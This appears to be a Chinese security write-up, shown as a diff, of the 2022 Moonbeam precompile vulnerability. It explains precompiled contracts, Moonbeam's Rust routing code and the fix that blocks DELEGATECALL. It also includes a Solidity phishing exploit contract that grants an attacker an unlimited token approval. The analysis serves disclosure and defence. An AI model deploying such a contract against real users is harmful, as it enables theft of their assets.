@@ -1,0 +1,217 @@
+2022 年 5 月，白帽组织 pwning.eth 向 Moonbeam 提交了一个关于预编译合约的严重漏洞，**该漏洞能使得攻击者任意转移他人资产，当时该漏洞所影响资金高达 1 亿美元。**
+
+据了解，该漏洞涉及对非标准以太坊预编译的调用。这些地址允许 EVM 通过智能合约访问 Moonbeam 的一些核心功能（如 XC-20、质押和民主 pallet），这些功能并不存在于基础的 EVM 中。通过 DELEGATECALL，一个恶意的智能合约可以回调访问另一方的预编译存储。
+
+普通用户不会遇到这个问题，这需要他们主动向该恶意智能合约发送交易。然而，对于其他允许任意调用外部智能合约的智能合约来说（比如部分允许回调的智能合约），这是一个问题。在这些情况下，不法使用者能对 DEX 执行对恶意智能合约的调用，该智能合约将能够访问伪装 DEX 的预编译，并可能将合约中的余额转移到任何其他地址。
+
+![](https://img.foresightnews.pro/202303/30a58fbeab2bad0fc5b52d9fe7e3e6f0.png?x-oss-process=style/scale70)
+
+**什么是预编译合约？**
+-------------
+
+在 EVM 中，一份合约代码会被解释成一个个的指令并执行，在每条指令执行过程中，EVM 都会对执行条件进行检查，也就是 gas 费是否充足，若 gas 不足，则会抛出错误。
+
+EVM 虚拟机在执行交易的过程中数据存储并不是基于寄存器，而是基于栈的操作，每次数据读写操作都必须从栈顶开始，所以导致其运行效率非常低，加上每一条指令都需要进行运行检查，那么在对一个相对复杂的运算进行执行时，可能需要大量的时间成本，而在区块链中，正需要很多这种复杂的运算，例如加密函数、哈希函数等，导致很多函数在 EVM 环境中执行是不现实的。
+
+部署预编译合约需要发起 EIP 提案，审核通过后将同步到各个客户端。例如以太坊实现的某些预编译合约：ercecover()（椭圆曲线公钥恢复，地址 0x1）、sha256hash()（Sha256Hash 计算，地址 0x2）、ripemd160hash()（Ripemd160Hash 计算，地址 0x3）等，这些函数都被设置成了一个固定的 gas 花费，而不用在调用过程中按照字节码进行 gas 计算，大大降低了时间成本与 gas 成本。并且由于预编译合约通常是在客户端用客户端代码实现，不需要使用 EVM，所以运行速度快。
+
+![](https://img.foresightnews.pro/202303/231df16996e13be3becf0bb90aafc814.jpeg?x-oss-process=style/scale70)
+
+**关于 Moonbeam 项目漏洞**
+--------------------
+
+在 Moonbeam 项目中，Balance ERC-20 precompile 提供了一个 ERC-20 接口来处理 balance 的原生代币，**合约可以使用 address.call 的方式对预编译合约进行调用，此处 address 为预编译地址，**下列是 moonbeam 修复之前的代码预编译合约调用的代码。
+
+fn execute(&self, handle: &mut impl PrecompileHandle) -> Option<PrecompileResult> {
+
+ match handle.code\_address() {
+
+  // Ethereum precompiles :
+
+  a if a == hash(1) => Some(ECRecover::execute(handle)),
+
+  a if a == hash(2) => Some(Sha256::execute(handle)),
+
+  a if a == hash(3) => Some(Ripemd160::execute(handle)),
+
+  a if a == hash(5) => Some(Modexp::execute(handle)),
+
+  a if a == hash(4) => Some(Identity::execute(handle)),
+
+  a if a == hash(6) => Some(Bn128Add::execute(handle)),
+
+  a if a == hash(7) => Some(Bn128Mul::execute(handle)),
+
+  a if a == hash(8) => Some(Bn128Pairing::execute(handle)),
+
+  a if a == hash(9) => Some(Blake2F::execute(handle)),
+
+  a if a == hash(1024) => Some(Sha3FIPS256::execute(handle)),
+
+  a if a == hash(1025) => Some(Dispatch::<R>::execute(handle)),
+
+  a if a == hash(1026) => Some(ECRecoverPublicKey::execute(handle)),
+
+  a if a == hash(2048) => Some(ParachainStakingWrapper::<R>::execute(handle)),
+
+  a if a == hash(2049) => Some(CrowdloanRewardsWrapper::<R>::execute(handle)),
+
+  a if a == hash(2050) => Some(
+
+   Erc20BalancesPrecompile::<R, NativeErc20Metadata>::execute(handle),
+
+  ),
+
+  a if a == hash(2051) => Some(DemocracyWrapper::<R>::execute(handle)),
+
+  a if a == hash(2052) => Some(XtokensWrapper::<R>::execute(handle)),
+
+  a if a == hash(2053) => Some(
+
+RelayEncoderWrapper::<R, WestendEncoder>::execute(handle)
+
+),
+
+  a if a == hash(2054) => Some(XcmTransactorWrapper::<R>::execute(handle)),
+
+  a if a == hash(2055) => Some(AuthorMappingWrapper::<R>::execute(handle)),
+
+  a if a == hash(2056) => Some(BatchPrecompile::<R>::execute(handle)),
+
+  // If the address matches asset prefix, the we route through the asset precompile set
+
+  a if &a.to\_fixed\_bytes()[0..4] == FOREIGN\_ASSET\_PRECOMPILE\_ADDRESS\_PREFIX => {
+
+   Erc20AssetsPrecompileSet::<R, IsForeign, ForeignAssetInstance>::new()
+
+    .execute(handle)
+
+  }
+
+  // If the address matches asset prefix, the we route through the asset precompile set
+
+  a if &a.to\_fixed\_bytes()[0..4] == LOCAL\_ASSET\_PRECOMPILE\_ADDRESS\_PREFIX => {
+
+   Erc20AssetsPrecompileSet::<R, IsLocal, LocalAssetInstance>::new().execute(handle)
+
+  }
+
+  \_ => None,
+
+ }
+
+}
+
+上述代码是由 Rust 语言实现的 moonbase 预编译合约集的执行方法（fn execute()），该方法会匹配调用的预编译合约地址，然后交由不同的预编译合约去处理输入的 data。执行方法传入的 handle（预编译交互句柄）包括了 call(call\_data) 中的相关内容，以及交易上下文信息等。
+
+因此当要调用 ERC20 预编译代币合约时，需通过 0x000...00802.call(fanction(type),parameter) 的方式（0x802=2050），便能调用 ERC20 预编译代币合约的相关函数。
+
+接下来我们先看一下使用 delegatecall(call\_data) 和 call(call\_data) 的区别:
+
+ 
+
+![](https://img.foresightnews.pro/202303/c34bec7cf297ca63bfd28d8ea6c3c81d.png?x-oss-process=style/scale70)
+
+![](https://img.foresightnews.pro/202303/ff507361194810ed1fcf08028743981d.png?x-oss-process=style/scale70)
+
+无论通过什么方式调用，EOA 信息和合约 B 无法通过合约 A 绑定到一起，这使得合约之间的调用是安全的。
+
+因此由于 moonbase 预编译合约集的执行方法（fn execute()）未检查调用的方式。那么当使用 delegatecall 去调用预编译合约，也会在预编译合约中去执行相关方法并写入预编译合约的存储中。即如下图所示，当 EOA 账户去调用了一个攻击者编写的恶意合约 A，A 中使用 delegatecall 的方式去调用了预编译合约 B。这将会在 A 和 B 中同时写入调用后的数据，实现钓鱼攻击。
+
+![](https://img.foresightnews.pro/202303/3f3c43597a8de8900a991de09bf299ca.png?x-oss-process=style/scale70)
+
+**漏洞利用过程**
+----------
+
+攻击者可以部署以下钓鱼合约，并通过钓鱼等方式诱使受害用户调用钓鱼函数 -uniswapV2Call，而函数会再次调用实现了 delegatecall(token\_approve) 的 stealLater 函数。
+
+根据上述介绍规则，攻击合约调用代币合约的 approve 函数授权（asset=0x000...00802），当用户调用 uniswapV2Call 之后，会在钓鱼合约和预编译合约的 storage 中同时写入授权，攻击者只用调用预编译合约的 transferfrom 函数便可将用户代币全部转移出去。
+
+pragma solidity >=0.8.0;
+
+contract ExploitFlashSwap {
+
+address asset;
+
+address beneficiary;
+
+constructor(address \_asset, address \_beneficiary) {
+
+asset = \_asset;
+
+beneficiary = \_beneficiary;
+
+}
+
+function stealLater() external {
+
+(bool success,) = asset.delegatecall(
+
+abi.encodeWithSignature(
+
+"approve(address,uint256)",
+
+beneficiary,
+
+(uint256)(int256(-1))
+
+)
+
+);
+
+require(success,"approve");
+
+}
+
+function uniswapV2Call(
+
+address sender,
+
+uint amount0,
+
+uint amount1,
+
+bytes calldata data
+
+) external {
+
+stealLater();
+
+}
+
+}
+
+**漏洞修复**
+--------
+
+随后开发者在 moonbase 预编译合约集的执行方法（fn execute()）中判断了 EVM 执行环境的地址是否和预编译地址一致，以确保只能使用 call() 方式对 0x000...00009 地址以后的预编译合约合约进行调用，项目方修复之后的代码如下：
+
+fn execute(&self, handle: &mut impl PrecompileHandle) -> Option<PrecompileResult> {
+
+  // Filter known precompile addresses except Ethereum officials
+
+  if self.is\_precompile(handle.code\_address())
+
+   && handle.code\_address() > hash(9)
+
+   && handle.code\_address() != handle.context().address
+
+  {
+
+   return Some(Err(revert(
+
+    "cannot be called with DELEGATECALL or CALLCODE",
+
+   )));
+
+  }
+
+  match handle.code\_address() {
+
+......
+
+**安全建议**
+--------
+
+关于这个问题，Beosin 安全团队建议，**项目方在项目开发过程中需要考虑到 delegatecall 和 call 的不同之处，被调用合约能通过 delegatecall 进行调用的，需要全方位思考其应用场景以及底层原理，做好严格的代码测试。**建议在项目上线前，寻找专业的区块链审计公司进行全面的安全审计。
+
